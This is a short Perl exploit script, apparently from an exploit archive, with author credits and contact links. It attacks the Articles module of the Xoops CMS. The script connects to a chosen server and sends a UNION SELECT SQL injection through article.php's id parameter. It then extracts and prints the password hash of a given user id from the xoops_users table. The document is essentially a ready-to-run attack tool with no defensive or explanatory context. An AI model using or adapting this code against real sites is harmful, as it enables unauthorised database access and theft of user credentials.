# Exploit :

#############################################

#Coded By Cr@zy_King http://coderx.org]#

#############################################

use IO::Socket;

if (@ARGV != 3)

{

print "\n-----------------------------------\n";

print "Xoops All Version -Articles- Article.PHP (ID) Blind SQL Injection ExpL0it\n";

print "-----------------------------------\n";

print "\n4ever Cra\n";

print "crazy_kinq[at]hotmail.co.uk\n";

print "http://coderx.org\n";

print "\n-----------------------------------\n";

print "\nKullanim: $0 <server> <path> <uid>\n";

print "Ornek: $0 www.victim.com /path 1\n";

print "\n-----------------------------------\n";

exit ();

}

$server = $ARGV[0];

$path = $ARGV[1];

$uid = $ARGV[2];

$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$server", PeerPort =>

"80");

printf $socket ("GET

%s/modules/articles/article.php?id=3/**/UNION/**/SELECT/**/NULL,NULL,NUL
L,NULL,NULL,pass,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,
NULL,NULL,NULL/**/FROM/**/xoops_users/**/WHERE/**/uid=$uid/* HTTP/1.0\nHost: %s\nAccept: */*\nConnection:

close\n\n",

$path,$server,$uid);

while(<$socket>)

{

if (/\>(\w{32})\</) { print "\nID '$uid' User Password :\n\n$1\n"; }

}

# Cr@zy_King

# http://coderx.org

# crazy_kinq (at) hotmail.co (dot) uk [email concealed]
